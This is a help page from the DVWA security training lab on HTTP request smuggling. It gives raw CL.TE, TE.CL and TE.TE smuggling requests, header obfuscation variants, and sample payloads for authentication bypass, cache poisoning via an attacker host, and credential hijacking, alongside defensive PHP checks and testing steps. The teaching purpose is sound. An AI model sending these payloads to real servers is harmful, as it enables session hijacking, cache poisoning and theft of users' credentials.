<?php

if (!defined('DVWA_WEB_PAGE_TO_ROOT')) {
	define( 'DVWA_WEB_PAGE_TO_ROOT', '../../../../' );
}

require_once DVWA_WEB_PAGE_TO_ROOT . 'dvwa/includes/dvwaPage.inc.php';
?>

<div class="body_padded">
	<h1>Help - HTTP Request Smuggling</h1>

	<div id="code">
		<table width="100%" bgcolor="white" style="border:2px #C0C0C0 solid">
			<tr>
				<td>
					<div id="code">
						<h3>About</h3>
						<p>HTTP Request Smuggling is a technique that exploits discrepancies in how different HTTP servers (frontend/proxy and backend/origin) parse HTTP request boundaries. When servers disagree about where one request ends and another begins, an attacker can "smuggle" a partial HTTP request inside the body of a legitimate request, which is then treated as a separate request by the backend server.</p>

						<p>This vulnerability is particularly dangerous in environments with multiple layers of HTTP servers, such as:</p>
						<ul>
							<li>Load balancers + application servers</li>
							<li>Reverse proxies + origin servers</li>
							<li>CDN + web servers</li>
							<li>WAF + application backend</li>
						</ul>

						<h3>How It Works</h3>
						<p>The attack exploits two HTTP mechanisms for specifying request body length:</p>
						<ul>
							<li><strong>Content-Length:</strong> Specifies body length in bytes</li>
							<li><strong>Transfer-Encoding:</strong> Uses chunked encoding with size indicators</li>
						</ul>
						
						<p>When both headers are present, servers may prioritize differently:</p>
						<ul>
							<li>Some servers use Content-Length</li>
							<li>Some servers use Transfer-Encoding</li>
							<li>Some servers process both (vulnerable to desynchronization)</li>
						</ul>

						<h3>Attack Techniques</h3>

						<h4>1. CL.TE (Content-Length / Transfer-Encoding)</h4>
						<p>Frontend uses Content-Length, backend uses Transfer-Encoding:</p>
						<pre>POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 6
Transfer-Encoding: chunked

0

G</pre>
						<p><strong>Explanation:</strong></p>
						<ul>
							<li>Frontend reads 6 bytes: "0\r\n\r\nG" and forwards complete request</li>
							<li>Backend uses chunked encoding, reads "0" chunk (end), leaves "G" in buffer</li>
							<li>"G" becomes start of next user's request</li>
							<li>Next request: "GET /account" becomes "GGET /account" (400 error for victim)</li>
						</ul>

						<h4>2. TE.CL (Transfer-Encoding / Content-Length)</h4>
						<p>Frontend uses Transfer-Encoding, backend uses Content-Length:</p>
						<pre>POST / HTTP/1.1
Host: vulnerable-site.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

</pre>
						<p><strong>Explanation:</strong></p>
						<ul>
							<li>Frontend reads chunked: "8\r\nSMUGGLED\r\n0\r\n\r\n"</li>
							<li>Backend reads Content-Length: 3 bytes only ("8\r\n")</li>
							<li>Remaining "SMUGGLED\r\n0\r\n\r\n" prepended to next request</li>
						</ul>

						<h4>3. TE.TE (Transfer-Encoding / Transfer-Encoding)</h4>
						<p>Both use Transfer-Encoding but one can be obfuscated:</p>
						<pre>POST / HTTP/1.1
Host: vulnerable-site.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

5
SMUGGLED
0

</pre>
						<p>Or with obfuscation:</p>
						<pre>Transfer-Encoding: chunked
Transfer-Encoding: x-chunked
Transfer-Encoding: chunked 
Transfer-Encoding: cow</pre>

						<h3>Real-World Attack Scenarios</h3>

						<h4>1. Authentication Bypass</h4>
						<pre>POST /login HTTP/1.1
Host: bank.com
Content-Length: 85
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: bank.com
Cookie: session=attacker_session
Content-Length: 5

x=1</pre>
						<p>Result: Attacker's smuggled /admin request uses next user's authenticated session.</p>

						<h4>2. Cache Poisoning</h4>
						<pre>POST / HTTP/1.1
Host: victim.com
Content-Length: 120
Transfer-Encoding: chunked

0

GET /js/app.js HTTP/1.1
Host: attacker.com
Content-Length: 10

x=</pre>
						<p>Result: Cache stores attacker's malicious JS as legitimate app.js, served to all users.</p>

						<h4>3. Credential Hijacking</h4>
						<pre>POST /search HTTP/1.1
Host: vulnerable.com
Content-Length: 100
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable.com
Content-Length: 100

username=</pre>
						<p>Result: Next user's POST data (including credentials) appended to smuggled request, logged by attacker.</p>

						<br /><hr /><br />

						<h3>Objective</h3>

						<p><span class="vuln_label">Low Level:</span> No validation of headers. Accepts and processes requests with both Content-Length and Transfer-Encoding headers. Demonstrates how conflicting headers create desynchronization opportunities.</p>

						<p><span class="vuln_label">Medium Level:</span> Detects conflicting headers and logs warnings, but still processes the request. Shows incomplete protection that can still be exploited.</p>

						<p><span class="vuln_label">High Level:</span> Properly rejects requests with conflicting Content-Length and Transfer-Encoding headers according to RFC 7230. Demonstrates correct implementation of HTTP/1.1 specification.</p>

						<p><span class="vuln_label">Impossible Level:</span> Comprehensive protection including:
						<ul>
							<li>RFC 7230 §3.3.3 strict compliance</li>
							<li>Rejection of all conflicting headers</li>
							<li>Detection of header obfuscation techniques</li>
							<li>Validation of multiple Content-Length headers</li>
							<li>CSRF token requirements</li>
							<li>Audit logging of all anomalies</li>
							<li>HTTP/2-style strict parsing</li>
						</ul>
						</p>

						<br /><hr /><br />

						<h3>Defense Mechanisms</h3>

						<h4>1. Reject Ambiguous Requests</h4>
						<pre>// Never process requests with both headers
if (isset($_SERVER['HTTP_CONTENT_LENGTH']) && 
    isset($_SERVER['HTTP_TRANSFER_ENCODING'])) {
    http_response_code(400);
    die('Conflicting headers detected');
}</pre>

						<h4>2. Follow RFC 7230 §3.3.3</h4>
						<p>If a message contains both Transfer-Encoding and Content-Length:</p>
						<ul>
							<li>The Transfer-Encoding MUST be processed first</li>
							<li>Content-Length MUST be removed</li>
							<li><strong>Or better: reject the request entirely</strong></li>
						</ul>

						<h4>3. Normalize Headers at Frontend</h4>
						<pre>// Apache/Nginx configuration
# Remove conflicting headers
RequestHeader unset Transfer-Encoding
RequestHeader unset Content-Length

# Then set appropriate header based on actual body</pre>

						<h4>4. Use HTTP/2</h4>
						<p>HTTP/2 uses binary framing instead of text parsing, eliminating request smuggling:</p>
						<ul>
							<li>No ambiguity in message boundaries</li>
							<li>Each frame has explicit length</li>
							<li>No support for Transfer-Encoding: chunked</li>
							<li>No multiple header values conflicts</li>
						</ul>

						<h4>5. Validate Transfer-Encoding</h4>
						<pre>// Only allow valid values
$valid = ['chunked', 'compress', 'deflate', 'gzip'];
$te = strtolower($_SERVER['HTTP_TRANSFER_ENCODING'] ?? '');

if ($te && !in_array($te, $valid)) {
    http_response_code(400);
    die('Invalid Transfer-Encoding');
}</pre>

						<h4>6. Detect Obfuscation</h4>
						<pre>// Check for obfuscated headers
$te = $_SERVER['HTTP_TRANSFER_ENCODING'] ?? '';

// Check for control characters, extra spaces, etc.
if (preg_match('/[\x00-\x1F\x7F]/', $te)) {
    http_response_code(400);
    die('Header obfuscation detected');
}</pre>

						<h4>7. Synchronize Frontend & Backend</h4>
						<ul>
							<li>Use identical HTTP parsing libraries</li>
							<li>Configure same priority (CL vs TE)</li>
							<li>Test with smuggling detection tools</li>
							<li>Monitor for 400/500 errors patterns</li>
						</ul>

						<br /><hr /><br />

						<h3>Testing for Request Smuggling</h3>

						<h4>Manual Testing with Burp Suite</h4>
						<ol>
							<li>Enable "Update Content-Length" in Repeater</li>
							<li>Send a request with conflicting headers</li>
							<li>Observe if subsequent requests behave strangely</li>
							<li>Use Burp's HTTP Request Smuggler extension</li>
						</ol>

						<h4>Automated Detection</h4>
						<pre># Using smuggler.py
python3 smuggler.py -u https://target.com

# Using Burp Suite extension
# Install "HTTP Request Smuggler" from BApp Store

# Using custom script
curl -X POST https://target.com \\
  -H "Content-Length: 6" \\
  -H "Transfer-Encoding: chunked" \\
  -d $'0\\r\\n\\r\\nG'</pre>

						<h4>Confirming Vulnerability</h4>
						<p>Signs of successful smuggling:</p>
						<ul>
							<li>Unexpected 404/405 errors from subsequent requests</li>
							<li>Timeout or connection reset</li>
							<li>Response from different endpoint than requested</li>
							<li>Another user's data in your response</li>
							<li>Server errors with "malformed request" messages</li>
						</ul>

						<h4>Time-Based Detection</h4>
						<pre>POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X</pre>
						<p>Send twice, then send normal GET:</p>
						<ul>
							<li>If vulnerable: GET will be prepended with "X", causing delay/timeout</li>
							<li>If secure: All requests process normally</li>
						</ul>

						<br /><hr /><br />

						<h3>Tools</h3>
						<ul>
							<li><strong>Burp Suite Pro:</strong> HTTP Request Smuggler extension</li>
							<li><strong>smuggler.py:</strong> Automated CL.TE/TE.CL detection</li>
							<li><strong>http-request-smuggling:</strong> Various PoC scripts</li>
							<li><strong>h2csmuggler:</strong> HTTP/2 cleartext smuggling</li>
						</ul>

						<br /><hr /><br />

						<h3>References</h3>
						<?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/web-security/request-smuggling', 'PortSwigger - HTTP Request Smuggling' ); ?><br>
						<?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-community/attacks/HTTP_Request_Smuggling', 'OWASP - HTTP Request Smuggling' ); ?><br>
						<?php echo dvwaExternalLinkUrlGet( 'https://cwe.mitre.org/data/definitions/444.html', 'CWE-444: Inconsistent Interpretation of HTTP Requests' ); ?><br>
						<?php echo dvwaExternalLinkUrlGet( 'https://www.rfcreader.com/#rfc7230_line2690', 'RFC 7230 §3.3.3 - Message Body Length' ); ?><br>
						<?php echo dvwaExternalLinkUrlGet( 'https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn', 'HTTP Desync Attacks: Request Smuggling Reborn' ); ?><br>
						<?php echo dvwaExternalLinkUrlGet( 'https://github.com/defparam/smuggler', 'smuggler.py - Automated Detection Tool' ); ?>
					</div>
				</td>
			</tr>
		</table>
	</div>
</div>
